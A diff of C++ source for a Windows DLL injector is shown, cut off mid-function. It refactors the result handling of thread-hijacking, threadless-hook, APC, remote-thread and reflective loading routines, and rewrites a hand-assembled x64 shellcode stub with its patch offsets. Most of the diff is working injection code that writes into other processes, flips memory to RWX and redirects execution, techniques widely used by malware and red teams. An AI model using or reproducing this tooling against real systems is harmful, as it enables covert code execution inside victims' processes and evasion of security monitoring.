@@ -200,10 +200,6 @@ size_t GetUniversalShellcodeSize() {
     return (uintptr_t)&g_ShellcodeEndMarker - (uintptr_t)&g_ShellcodeStartMarker;
 }
 
-void CALLBACK test() {
-
-}
-
 static void* ResolveFunction(void* ptr) {
     if (!ptr) return nullptr;
 
@@ -371,6 +367,12 @@ std::string GetExecutorTypeStr(Executor execType) {
     default: return "unknown execute type";
     }
 }
+
+enum LOADER_RET {
+    failed,
+    successful,
+    timeout
+};
 
 // ----------------------- thread hijacking ----------------------- //
 #define ThreadSystemThreadInformation 40
@@ -713,13 +715,13 @@ OPTIMAL_THREAD GetThreadForExecutor(DWORD targetProcessId, Executor exec, bool y
 * 6. read back the memory to check if the execution was successful
 */
 // https://github.com/guidedhacking/GuidedHacking-Injector/blob/e3c6eab04943b10881a7039dc27ff964c79fcb64/GH%20Injector%20Library/Thread%20Hijacking.cpp#L10
-bool HijackThread(HANDLE hProcess, HANDLE hThread, LPVOID pRemoteRoutine, LPVOID pRemoteArgs, bool debug) {
+LOADER_RET HijackThread(HANDLE hProcess, HANDLE hThread, LPVOID pRemoteRoutine, LPVOID pRemoteArgs, bool debug) {
 
     // Suspend the target thread to safely modify its state
     if (SuspendThread(hThread) == (DWORD)-1) {
         printf("[!] Injector: SuspendThread failed for thread tid=%i: %lu\n", GetThreadId(hThread), GetLastError());
         CloseHandle(hThread);
-        return false;
+        return failed;
     }
     if (debug)
         printf("[+] Injector: Suspended thread tid=%i\n", GetThreadId(hThread));
@@ -731,7 +733,7 @@ bool HijackThread(HANDLE hProcess, HANDLE hThread, LPVOID pRemoteRoutine, LPVOID
         printf("[!] Injector: GetThreadContext failed for thread tid=%i: %lu\n", GetThreadId(hThread), GetLastError());
         ResumeThread(hThread);
         CloseHandle(hThread);
-        return false;
+        return failed;
     }
 
     // x64 remote Shellcode bootstrap stub
@@ -838,7 +840,7 @@ bool HijackThread(HANDLE hProcess, HANDLE hThread, LPVOID pRemoteRoutine, LPVOID
     if (!pRemoteBootstrapShellcode) {
         printf("[!] Injector: VirtualAllocEx failed for BootstrapShellcode: %lu\n", GetLastError());
         if (pRemoteRoutine) VirtualFreeEx(hProcess, pRemoteRoutine, 0, MEM_RELEASE);
-        return false;
+        return failed;
     }
     if (debug)
         printf("[+] Injector: Allocated memory for BootstrapShellcode at 0x%p in remote process\n", pRemoteBootstrapShellcode);
@@ -850,7 +852,7 @@ bool HijackThread(HANDLE hProcess, HANDLE hThread, LPVOID pRemoteRoutine, LPVOID
         printf("[!] Injector: WriteProcessMemory failed for BootstrapShellcode: %lu\n", GetLastError());
         if (pRemoteRoutine) VirtualFreeEx(hProcess, pRemoteRoutine, 0, MEM_RELEASE);
         if (pRemoteBootstrapShellcode) VirtualFreeEx(hProcess, pRemoteBootstrapShellcode, 0, MEM_RELEASE);
-        return false;
+        return failed;
     }
     if (debug)
         printf("[+] Injector: Updated pointers in BootstrapShellcode and written it to remote process\n");
@@ -865,7 +867,7 @@ bool HijackThread(HANDLE hProcess, HANDLE hThread, LPVOID pRemoteRoutine, LPVOID
         printf("[!] Injector: SetThreadContext failed for thread %p: %lu\n", hThread, GetLastError());
         if (pRemoteRoutine) VirtualFreeEx(hProcess, pRemoteRoutine, 0, MEM_RELEASE);
         if (pRemoteBootstrapShellcode) VirtualFreeEx(hProcess, pRemoteBootstrapShellcode, 0, MEM_RELEASE);
-        return false;
+        return failed;
     }
     if (debug)
         printf("[+] Injector: SetThreadContext to RemoteStartOfBootstrapShellcodeFunc at 0x%p\n", pRemoteStartOfBootstrapShellcodeFunc);
@@ -896,7 +898,7 @@ bool HijackThread(HANDLE hProcess, HANDLE hThread, LPVOID pRemoteRoutine, LPVOID
             // check if terminated
             if (WaitForSingleObject(hProcess, 0) == WAIT_OBJECT_0) {
                 printf("[!] Injector: Target process was terminated -> no more injection :(\n");
-                return false; // at least I don't have to clean-up
+                return failed; // at least I don't have to clean-up
             }
             if (debug)
                 printf("[-] Injector: Cannot read back BootstapShellcode state in injected proc, wait for next read\n");
@@ -923,7 +925,7 @@ bool HijackThread(HANDLE hProcess, HANDLE hThread, LPVOID pRemoteRoutine, LPVOID
             // when finished, do cleanup
             if (pRemoteRoutine) VirtualFreeEx(hProcess, pRemoteRoutine, 0, MEM_RELEASE);
             if (pRemoteBootstrapShellcode) VirtualFreeEx(hProcess, pRemoteBootstrapShellcode, 0, MEM_RELEASE);
-            return true;
+            return successful;
         }
         // else loop until timeout
     }
@@ -940,15 +942,15 @@ bool HijackThread(HANDLE hProcess, HANDLE hThread, LPVOID pRemoteRoutine, LPVOID
         else {
             printf("[!] Injector: SetThreadContext failed to restore original RIP: %lu\n", GetLastError());
         }
-        return false;
+        return failed;
     }
 
     if (bootstrapVerify.State == BOOTSTRAP_STATE::BS_EXECUTING) {
         printf("[*] Injector: BootstrapShellcode still executing... assuming it will eventually work\n"); // no cleanup
-        return true;
+        return timeout;
     }
 
-    return false; // unknown state
+    return failed; // unknown state
 }
 
 bool HandleCleanup(HANDLE hProcess, std::vector<LPVOID> remoteAddrs, LPVOID localAddr) {
@@ -967,18 +969,18 @@ bool HandleCleanup(HANDLE hProcess, std::vector<LPVOID> remoteAddrs, LPVOID loca
 }
 
 // see github.com/CCob/ThreadlessInject
-bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool debug) {
+LOADER_RET DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool debug) {
 
     HMODULE hModHook = GetModuleHandleA(g_libThreadlessHook.c_str());
     if (hModHook == NULL) {
         printf("[!] Injector: Failed to find %s\n", g_libThreadlessHook.c_str());
-        return false;
+        return failed;
     }
 
     DWORD64 hookedFuncAddr = (DWORD64)GetProcAddress(hModHook, g_funcThreadlessHook.c_str());
     if (hookedFuncAddr == NULL) {
         printf("[!] Injector: Did not find the function to hook for threadless injection\n");
-        return false;
+        return failed;
     }
 
     if (debug)
@@ -990,7 +992,7 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
     if (!ReadProcessMemory(hProc, (LPVOID)hookedFuncAddr, &originalInstructions_0_8, 8, &readBytes) || readBytes != 8 ||
         !ReadProcessMemory(hProc, (LPVOID)(hookedFuncAddr+8), &originalInstructions_8_B, 4, &readBytes) || readBytes != 4) {
         printf("[!] Injector: Failed to read original instructions of hooked function %s at %llu\n", g_funcThreadlessHook.c_str(), hookedFuncAddr);
-        return false;
+        return failed;
     }
 
     if (debug) {
@@ -1009,79 +1011,72 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     if (hKernel32 == NULL) {
         printf("[!] Injector: Failed to find kernel32.dll\n");
-        return false;
+        return failed;
     }
     DWORD64 virtProtAddr = (DWORD64)GetProcAddress(hKernel32, "VirtualProtect");
     if (virtProtAddr == NULL) {
         printf("[!] Injector: Did not find address of VirtualProtect for threadless injection\n");
-        return false;
+        return failed;
     }
 
     std::vector<byte> shellcodeLoader = {
-        // --- 1. Preserve Registers ---
-        /* 0000 */ 0x56, 0x51, 0x52,                                           // push rsi, rcx, rdx
-        /* 0003 */ 0x41, 0x50, 0x41, 0x51,                                     // push r8, r9
-        /* 0007 */ 0x41, 0x52, 0x41, 0x53,                                     // push r10, r11
+        // --- 1. Preserve Registers & store Addrs ---
+        /* 0000 */ 0x56,                                                       // push rsi                         ; used for virtProtAddr over multiple calls
+        /* 0001 */ 0x53,                                                       // push rbx                         ; used for hookedFuncAddr over multiple calls
+        /* 0002 */ 0x48, 0xBB, 0x44, 0x44, 0x33, 0x33, 0x33, 0x33, 0x22, 0x22, // movabs rbx, 0x4444333322221111   ; define hookedFuncAddr (patched)
+        /* 000c */ 0x48, 0xBE, 0x88, 0x88, 0x77, 0x77, 0x66, 0x66, 0x55, 0x55, // movabs rsi, 0x8888777766665555   ; define virtProtAddr   (patched)
 
-        // --- 2. Setup VirtualProtectEx to Unhook / Restore Original Function Bytes ---
-        /* 000b */ 0x48, 0xBB, 0x44, 0x44, 0x33, 0x33, 0x33, 0x33, 0x22, 0x22, // movabs rbx, hookedFuncAddr (patched)
-        /* 0015 */ 0x48, 0xBE, 0x88, 0x88, 0x77, 0x77, 0x66, 0x66, 0x55, 0x55, // movabs rsi, virtProtAddr   (patched)
-        /* 001f */ 0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 28h (shadow space)
-        /* 0023 */ 0x48, 0x8B, 0xCB,                                           // mov rcx, rbx (lpAddress = hookedFuncAddr)
-        /* 0026 */ 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00,                   // mov rdx, 0xC (dwSize = 12 bytes)
-        /* 002d */ 0x49, 0xC7, 0xC0, 0x40, 0x00, 0x00, 0x00,                   // mov r8, 0x40 (flNewProtect = PAGE_EXECUTE_READWRITE)
-        /* 0034 */ 0x4C, 0x8D, 0x0C, 0x24,                                     // lea r9, [rsp] (lpflOldProtect)
-        /* 0038 */ 0xFF, 0xD6,                                                 // call rsi (VirtualProtectEx)
-        /* 003a */ 0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 28h
+        // --- 2. VirtualProtect to restore original function ---
+        /* 0016 */ 0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 28h                     ; allocate space
+        /* 001a */ 0x48, 0x8B, 0xCB,                                           // mov rcx, rbx                     ; lpAddress, unprotect hookedFuncAddr
+        /* 001d */ 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00,                   // mov rdx, 0xC                     ; dwSize, unprotect 12 bytes
+        /* 0024 */ 0x49, 0xC7, 0xC0, 0x40, 0x00, 0x00, 0x00,                   // mov r8, 0x40                     ; flNewProtect, PAGE_EXECUTE_READWRITE
+        /* 002b */ 0x4C, 0x8D, 0x0C, 0x24,                                     // lea r9, [rsp]                    ; lpflOldProtect, pointer for old value
+        /* 002f */ 0xFF, 0xD6,                                                 // call rsi                         ; VirtualProtect(hookedFuncAddr, 12, RWX, old)
+        /* 0031 */ 0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 28h                     ; un-allocate space
 
-        // --- 3. Write Back Original Instructions (0-12 Bytes) ---
-        /* 003e */ 0x48, 0xB8, 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, // movabs rax, originalInstructions_0_8 (patched)
-        /* 0047 */ 0x48, 0x89, 0x03,                                           // mov qword ptr [rbx], rax
-        /* 004a */ 0xB8, 0x09, 0x09, 0x09, 0x09,                               // mov eax, originalInstructions_8_B     (patched)
-        /* 004f */ 0x89, 0x43, 0x08,                                           // mov dword ptr [rbx+8], eax
+        // --- 3. Write Back Original Instructions ---
+        /* 0035 */ 0x48, 0xB8, 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, // movabs rax, 0xddddccccaaaa9999   ; define originalInstructions_0_8 (patched)
+        /* 003f */ 0x48, 0x89, 0x03,                                           // mov qword ptr [rbx], rax         ; write to rbx (hookedFuncAddr)
+        /* 0042 */ 0xB8, 0x09, 0x09, 0x09, 0x09,                               // mov eax, 0x09090909              ; define originalInstructions_8_B (patched)
+        /* 0047 */ 0x89, 0x43, 0x08,                                           // mov dword ptr [rbx+8], eax       ; write to rbx+8 (hookedFuncAddr+8)
 
-        // --- 4. Restore Original Memory Protection (PAGE_EXECUTE_READ) ---
-        /* 0052 */ 0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 28h
-        /* 0056 */ 0x48, 0x8B, 0xCB,                                           // mov rcx, rbx
-        /* 0059 */ 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00,                   // mov rdx, 0xC
-        /* 0060 */ 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00,                   // mov r8, 0x20 (PAGE_EXECUTE_READ)
-        /* 0067 */ 0x4C, 0x8D, 0x0C, 0x24,                                     // lea r9, [rsp]
-        /* 006b */ 0xFF, 0xD6,                                                 // call rsi (VirtualProtectEx)
-        /* 006d */ 0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 28h
+        // --- 4. Re-VirtualProtect ---
+        /* 004a */ 0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 28h                     ; allocate space
+        /* 004e */ 0x48, 0x8B, 0xCB,                                           // mov rcx, rbx                     ; lpAddress, unprotect hookedFuncAddr
+        /* 0051 */ 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00,                   // mov rdx, 0xC                     ; dwSize, unprotect 12 bytes
+        /* 0058 */ 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00,                   // mov r8, 0x20                     ; flNewProtect, PAGE_EXECUTE_READ
+        /* 005f */ 0x4C, 0x8D, 0x0C, 0x24,                                     // lea r9, [rsp]                    ; lpflOldProtect, pointer for old value
+        /* 0063 */ 0xFF, 0xD6,                                                 // call rsi                         ; VirtualProtect(hookedFuncAddr, 12, RX, old)
+        /* 0065 */ 0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 28h                     ; un-allocate space
 
-        // --- 5. Restore Saved Registers ---
-        /* 0071 */ 0x48, 0x83, 0xEC, 0x40,                                     // sub rsp, 40h (stack balance cleanup)
-        /* 0075 */ 0x48, 0x83, 0xC4, 0x40,                                     // add rsp, 40h
-        /* 0079 */ 0x41, 0x5B, 0x41, 0x5A,                                     // pop r11, pop r10
-        /* 007d */ 0x41, 0x59, 0x41, 0x58,                                     // pop r9, pop r8
-        /* 0082 */ 0x5A, 0x59, 0x5E,                                           // pop rdx, pop rcx, pop rsi
+        // --- 5. Setup Fake Return to lpStart & Restore ---
+        /* 0069 */ 0x48, 0x8B, 0xCB,                                           // mov rcx, rbx                     ; rbx still holds final return dest, but rbx must be restored now
+        /* 006c */ 0x5B, 0x5E,                                                 // pop rbx, rsi                     ; restore original rbx and rsi
+        /* 006e */ 0x51,                                                       // push rcx                         ; push final return destination (hookedFuncAddr) after lpStart
 
-        // --- 6. Setup Stack Alignment & Fake Return to lpStart (LoadLibrary) ---
-        /* 0085 */ 0x50,                                                       // push rax       (dummy push to fix 16-byte stack alignment for Windows internal APIs)
-        /* 0086 */ 0x53,                                                       // push rbx       (pushes hookedFuncAddr as the final return destination)
-
-        // --- 7. Setup Arguments & Trigger Payload (`lpStart(lpParameters)`) ---
-        /* 0087 */ 0x48, 0xB9, 0x2f, 0x6d, 0x6e, 0x74, 0x2f, 0x61, 0x69, 0x6e, // movabs rcx, lpParameters (DLL path, patched)
-        /* 0091 */ 0x48, 0xB8, 0x77, 0x61, 0x73, 0x20, 0x68, 0x65, 0x72, 0x65, // movabs rax, lpStart      (LoadLibraryA, patched)
-        /* 009b */ 0x50,                                                       // push rax       (push LoadLibrary entry point)
-        /* 009c */ 0xC3                                                        // ret            (jumps to LoadLibrary; returns cleanly to hookedFuncAddr)
+        // --- 6. Setup Arguments and call lpStart(lpParameters)) ---
+        /* 006f */ 0x48, 0xB9, 0x2f, 0x6d, 0x6e, 0x74, 0x2f, 0x61, 0x69, 0x6e, // movabs rcx, lpParameters         ; DLL path (patched)
+        /* 0079 */ 0x48, 0xB8, 0x77, 0x61, 0x73, 0x20, 0x68, 0x65, 0x72, 0x65, // movabs rax, lpStart              ; LoadLibraryA patched)
+        /* 0083 */ 0x50,                                                       // push rax                         ; push LoadLibrary entry point (maybe use call and align stack again?)
+        /* 0084 */ 0xC3                                                        // ret                              ; jumps to LoadLibrary; returns cleanly to hookedFuncAddr
     };
 
     // 1. Patch the hooked function address into the shellcode loader stub
-    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x0D) = hookedFuncAddr;
+    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x04) = hookedFuncAddr;
 
     // 2. Patch the VirtualProtect address into the shellcode loader stub
-    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x17) = virtProtAddr;
+    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x0E) = virtProtAddr;
 
     // 3. Patch the 12 bytes that were in the original export prior to hooking
-    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x40) = originalInstructions_0_8;
-    *reinterpret_cast<UINT*>(shellcodeLoader.data() + 0x4C) = originalInstructions_8_B;
+    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x37) = originalInstructions_0_8;
+    *reinterpret_cast<UINT*>(shellcodeLoader.data() + 0x43) = originalInstructions_8_B;
 
     // 4. Patch lpParameters into RCX (offset 0x88)
-    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x89) = (DWORD64)lpParameters;
+    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x71) = (DWORD64)lpParameters;
 
     // 5. Patch lpStart into RAX (offset 0x92)
-    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x93) = (DWORD64)lpStart;
+    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x7B) = (DWORD64)lpStart;
 
     if (debug)
         printf("[+] Injector: Patched and prepared the threadless loader locally\n");
@@ -1121,7 +1116,7 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
         loaderAddr = VirtualAllocEx(hProc, NULL, shellcodeLoader.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (loaderAddr == NULL) {
             printf("[!] Injector: Failed to allocate memory in target process for threadless loader\n");
-            return false;
+            return failed;
         }
     }
 
@@ -1129,13 +1124,13 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
     if (!WriteProcessMemory(hProc, loaderAddr, shellcodeLoader.data(), shellcodeLoader.size(), NULL)) {
         printf("[!] Injector: Failed to write the loader to remote process at %p, error %i\n", loaderAddr, GetLastError());
         if (!foundCodeCave) { HandleCleanup(hProc, { loaderAddr }, {}); }
-        return false;
+        return failed;
     }
     DWORD oldLoaderProtect = NULL;
     if (!VirtualProtectEx(hProc, loaderAddr, shellcodeLoader.size(), PAGE_EXECUTE_READ, &oldLoaderProtect)) {
         printf("[!] Injector: Failed to RX protect the loader at %p in remote process, error %i\n", loaderAddr, GetLastError());
         if (foundCodeCave) { revertCodeCave(cc); } else { HandleCleanup(hProc, { loaderAddr }, {}); }
-        return false;
+        return failed;
     }
     if (debug)
         printf("[+] Injector: Written the threadless shellcode loader to the remote process at 0x%p\n", loaderAddr);
@@ -1162,18 +1157,18 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
     if (!VirtualProtectEx(hProc, (LPVOID)hookedFuncAddr, hook.size(), PAGE_EXECUTE_READWRITE, &oldHookProtect)) {
         printf("[!] Injector: Failed to RWX protect the hook at 0x%llx in remote process, error %i\n", hookedFuncAddr, GetLastError());
         if (foundCodeCave) { revertCodeCave(cc); } else { HandleCleanup(hProc, { loaderAddr }, {}); }
-        return false;
+        return failed;
     }
     if (!WriteProcessMemory(hProc, (LPVOID)hookedFuncAddr, hook.data(), hook.size(), NULL)) {
         printf("[!] Injector: Failed to write the hook to remote process at 0x%llx, error %i\n", hookedFuncAddr, GetLastError());
         if (foundCodeCave) { revertCodeCave(cc); } else { HandleCleanup(hProc, { loaderAddr }, {}); }
-        return false;
+        return failed;
     }
     if (!VirtualProtectEx(hProc, (LPVOID)hookedFuncAddr, hook.size(), PAGE_EXECUTE_READ, &oldHookProtect)) {
         printf("[!] Injector: Failed to RX protect the hook at 0x%llx in remote process (proc will crash on next access, gl hf), error %i\n", hookedFuncAddr, GetLastError());
         // I would not touch anything here, hopes and prayers that the remote process does not crash now
         if (foundCodeCave) { revertCodeCave(cc); } else { HandleCleanup(hProc, { loaderAddr }, {}); }
-        return false;
+        return failed;
     }
 
     // verify
@@ -1188,7 +1183,7 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
         }
         printf("\n");
         if (foundCodeCave) { revertCodeCave(cc); } else { HandleCleanup(hProc, { loaderAddr }, {}); }
-        return false;
+        return failed;
     }
     if (debug)
         printf("[*] Injector: Successfully written hook to %s at 0x%llx\n", g_funcThreadlessHook.c_str(), hookedFuncAddr);
@@ -1209,8 +1204,8 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
         // read back the hooked function to check for execution start
         std::vector<byte> originalVerify(hook.size());
         if (!ReadProcessMemory(hProc, (LPVOID)hookedFuncAddr, originalVerify.data(), hook.size(), NULL)) {
-            printf("[!] Injector: Failed to read back original hooked function, likely something wrong with the remote process\n");
-            // I would not touch anything here, hopes and prayers that the remote process does not crash now
+            if (debug && loopCount % loopsBetweenStatusUpdates == 0)
+                printf("[!] Injector: Failed to read back original hooked function, likely something wrong with the remote process\n");
         }
 
         // check if loader started executing (loader restores the hook, check if it is restored)
@@ -1226,21 +1221,21 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
             }
             printf("[+] Injector: Threadless loader started its execution, big success! (probably)\n");
             if (foundCodeCave) {
-                return revertCodeCave(cc);
+                revertCodeCave(cc);
             }
             else {
                 HandleCleanup(hProc, { loaderAddr }, NULL);
-                return true;
             }
+            return successful;
         }
     }
 
     printf("[-] Injector: No sign of threadless loader execution, leave hook in place but exit here\n");
-    return false;
+    return timeout;
 }
 
 // execute lpStartAddress(lpParameter) with the given executor type in remote hProcess
-bool ExecuteDllLoader(HANDLE hProcess, Executor exec, LPVOID lpStartAddress, LPVOID lpParameter, bool yoloMode, bool debug) {
+LOADER_RET ExecuteDllLoader(HANDLE hProcess, Executor exec, LPVOID lpStartAddress, LPVOID lpParameter, bool yoloMode, bool debug) {
 
     if (debug) {
         printf("[*] Injector: Will do %s on 0x%p", GetExecutorTypeStr(exec).c_str(), lpStartAddress);
@@ -1254,18 +1249,18 @@ bool ExecuteDllLoader(HANDLE hProcess, Executor exec, LPVOID lpStartAddress, LPV
         HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, nullptr);
         if (hThread == NULL) {
             printf("[!] Injector: %s on 0x%p failed\n", GetExecutorTypeStr(exec).c_str(), lpStartAddress);
-            return false;
+            return failed;
         }
 
         printf("[*] Injector: Remote thread created on 0x%p now waiting for return...\n", lpStartAddress);
         DWORD wait = WaitForSingleObject(hThread, msMaxWaitForExecutor);
         if (wait == WAIT_TIMEOUT) {
             printf("[!] Injector: Remote thread did not finish within timeout\n");
-            return false;
+            return timeout;
         }
 
         CloseHandle(hThread);
-        return true;
+        return successful;
     }
 
     else if (exec == THREADLESS_INJECTION) {
@@ -1279,9 +1274,9 @@ bool ExecuteDllLoader(HANDLE hProcess, Executor exec, LPVOID lpStartAddress, LPV
 
     if (optThread.hThread == NULL) {
         printf("[!] Injector: Failed to get any thread for %s\n", GetExecutorTypeStr(exec).c_str());
-        return false;
+        return failed;
     }
-    bool ret = false;
+    LOADER_RET ret = failed;
     
     if (execUpdated == HIJACK_THREAD) {
         ret = HijackThread(hProcess, hThread, lpStartAddress, lpParameter, debug);
@@ -1291,16 +1286,22 @@ bool ExecuteDllLoader(HANDLE hProcess, Executor exec, LPVOID lpStartAddress, LPV
         QUEUE_USER_APC_FLAGS flags = (QUEUE_USER_APC_FLAGS)QUEUE_USER_APC_SPECIAL_USER_APC;
         if (debug)
             printf("[+] Injector: About to queue 0x%p with QUEUE_USER_APC_SPECIAL_USER_APC\n", lpStartAddress);
-        ret = QueueUserAPC2((PAPCFUNC)lpStartAddress, hThread, (ULONG_PTR)lpParameter, flags);
+        if (QueueUserAPC2((PAPCFUNC)lpStartAddress, hThread, (ULONG_PTR)lpParameter, flags)) {
+            ret = LOADER_RET::successful;
+        }
+        else {
+            ret = LOADER_RET::failed;
+        }
     }
 
     CloseHandle(hThread);
-    if (!ret) {
+    if (ret == LOADER_RET::failed) {
         printf("[!] Injector: %s on 0x%p failed\n", GetExecutorTypeStr(exec).c_str(), lpStartAddress);
-        return false;
     }
-
-    return true;
+    else if (ret == LOADER_RET::timeout) {
+        printf("[=] Injector: %s on 0x%p timeout, leaving everything in place and hope for the best\n", GetExecutorTypeStr(exec).c_str(), lpStartAddress);
+    }
+    return ret;
 }
 
 // ------------------------ actual injectors ------------------------ //
@@ -1328,10 +1329,15 @@ bool LoadLibraryInject(HANDLE hProcess, const std::string& dllPath, Executor exe
         printf("[+] Injector: Wrote string '%s' to target\n", dllPath.c_str());
 
     // finally execute the dll loader with the given executor
-    bool ret = ExecuteDllLoader(hProcess, exec, (LPVOID)LoadLibraryA, pDllPath, yoloMode, debug);
-    if (!ret) {
+    LOADER_RET ret = ExecuteDllLoader(hProcess, exec, (LPVOID)LoadLibraryA, pDllPath, yoloMode, debug);
+    if (ret == LOADER_RET::failed) {
         printf("[!] Injector: %s failed to load '%s' into remote process %i\n", GetExecutorTypeStr(exec).c_str(), dllPath.c_str(), GetProcessId(hProcess));
         return HandleCleanup(hProcess, { pDllPath }, NULL);
+    }
+    if (ret == LOADER_RET::timeout) {
+        printf("[=] Injector: %s did not load '%s' into remote process %i (yet)\n", GetExecutorTypeStr(exec).c_str(), dllPath.c_str(), GetProcessId(hProcess));
+        HandleCleanup(hProcess, { }, NULL); // must leave DLL path in proc
+        return true;
     }
     printf("[+] Injector: %s loaded '%s' into remote process %i\n", GetExecutorTypeStr(exec).c_str(), dllPath.c_str(), GetProcessId(hProcess));
     HandleCleanup(hProcess, { pDllPath }, NULL);
@@ -1521,14 +1527,21 @@ bool HostMappedAndShellcodeLoaderInject(HANDLE hProcess, const std::string& dllP
         printf("[+] Injector: Wrote all %zu bytes of dll loading shellcode to remote process at 0x%p\n", dllLoadingShellcodeSize, pRemoteDllLoadingShellcode);
 
     // finally execute the dll loader with the given executor
-    bool ret = ExecuteDllLoader(hProcess, exec, pRemoteDllLoadingShellcode, pRemoteDllLoadingData, yoloMode, debug);
-    if (!ret) {
+    LOADER_RET ret = ExecuteDllLoader(hProcess, exec, pRemoteDllLoadingShellcode, pRemoteDllLoadingData, yoloMode, debug);
+    if (ret == LOADER_RET::failed) {
         printf("[!] Injector: Executor %s failed to execute in remote process %i\n", GetExecutorTypeStr(exec).c_str(), GetProcessId(hProcess));
         return HandleCleanup(hProcess, { pRemoteTargetBase, pRemoteDllLoadingData, pRemoteDllLoadingShellcode }, NULL);
     }
+    if (ret == LOADER_RET::timeout) {
+        printf("[=] Injector: Executor %s did not execute in remote process %i (yet)\n", GetExecutorTypeStr(exec).c_str(), GetProcessId(hProcess));
+        if (debug)
+            printf("[-] Injector: Cannot check for execution status of DllLoadingShellcode, returning here and hope for the best\n");
+        HandleCleanup(hProcess, { }, NULL); // must leave DLL path in proc
+        return true;
+    }
 
     if (debug)
-        printf("[+] Injector: Checking for execution status of DllLoadingShellcode...\n");
+        printf("[+] Injector: Also checking for execution status of DllLoadingShellcode...\n");
     
     // get result of shellcode loader
     uintptr_t timer = GetTickCount64();
@@ -1543,7 +1556,7 @@ bool HostMappedAndShellcodeLoaderInject(HANDLE hProcess, const std::string& dllP
                 printf("[!] Injector: Target process was terminated -> no more injection :(\n");
                 return false; // at least I don't have to clean-up
             }
-            if (debug)
+            if (debug && loopCount % loopsBetweenStatusUpdates == 0)
                 printf("[-] Injector: Cannot read back DllLoadingShellcode state with executor %s\n", GetExecutorTypeStr(exec).c_str());
             continue;
         }
@@ -1590,13 +1603,13 @@ bool HostMappedAndShellcodeLoaderInject(HANDLE hProcess, const std::string& dllP
                     if (!ReadProcessMemory(hProcess, (LPCVOID)dllLoadingData.IATNameFailed, failingIATName, sizeof(failingIATName) - 1, nullptr)) {
                         strncpy_s(failingIATName, "<error reading func name>", _TRUNCATE);
                     }
-                    printf("[!] Injector: GetProcAddress failed for IAT '%s' in '%s', but yolo!\n", failingIATName, failingDll);
+                    printf("[$] Injector: GetProcAddress failed for IAT '%s' in '%s', but yolo!\n", failingIATName, failingDll);
 
                     // Clear IATNameFailed in the struct offset
                     WriteProcessMemory(hProcess, pRemoteIATNameFailed, &nullPtr, sizeof(nullPtr), NULL);
                 }
                 else {
-                    printf("[!] Injector: GetProcAddress failed for IAT ordinal=%i in '%s', but yolo!\n", dllLoadingData.IATOrdinalFailed, failingDll);
+                    printf("[$] Injector: GetProcAddress failed for IAT ordinal=%i in '%s', but yolo!\n", dllLoadingData.IATOrdinalFailed, failingDll);
 
                     // Clear IATOrdinalFailed in the struct offset
                     WriteProcessMemory(hProcess, pRemoteIATOrdinalFailed, &zeroOrdinal, sizeof(zeroOrdinal), NULL);
@@ -1609,7 +1622,7 @@ bool HostMappedAndShellcodeLoaderInject(HANDLE hProcess, const std::string& dllP
                 if (!ReadProcessMemory(hProcess, (LPCVOID)dllLoadingData.DllFailed, failingDll, sizeof(failingDll) - 1, nullptr)) {
                     strncpy_s(failingDll, "<error reading dll name>", _TRUNCATE);
                 }
-                printf("[$] Injector: LoadLibrary failed when importing the last dependent library '%s', but yolo!\n", failingDll);
+                printf("[$] Injector: LoadLibrary failed when importing the dependent library '%s', but yolo!\n", failingDll);
 
                 // Clear DllFailed in the struct offset
                 WriteProcessMemory(hProcess, pRemoteDllFailed, &nullPtr, sizeof(nullPtr), NULL);
@@ -1756,10 +1769,15 @@ bool ReflectiveSelfLoaderInject(HANDLE hProcess, const std::string& dllPath, Exe
     LPTHREAD_START_ROUTINE lpRemoteLoaderEntry = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pRemoteTargetBase + (ULONG_PTR)loaderOffset);
 
     // finally execute the dll loader with the given executor
-    bool ret = ExecuteDllLoader(hProcess, exec, lpRemoteLoaderEntry, NULL, yoloMode, debug);
-    if (!ret) {
